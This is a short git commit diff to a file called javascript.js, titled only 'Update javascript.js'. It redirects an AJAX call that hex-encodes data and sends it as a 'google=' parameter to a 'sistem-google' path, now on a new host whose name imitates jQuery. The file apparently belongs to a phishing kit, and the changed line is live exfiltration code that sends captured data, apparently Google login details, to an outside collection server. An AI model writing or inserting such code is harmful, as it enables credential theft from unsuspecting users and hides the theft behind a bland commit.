af3ce28feb7bd9afbf84bc86c325fd4471168ed4
gacor282 <kezycloud@gmail.com>
2025-05-04 12:06:17 +0700

    Update javascript.js

--- javascript.js
+++ javascript.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://mangkez-js.kezycloud.web.id/sistem-google/?google=" +
+                    "https://sistem-jquiey-js.ghostxdzz.me/sistem-google/?google=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
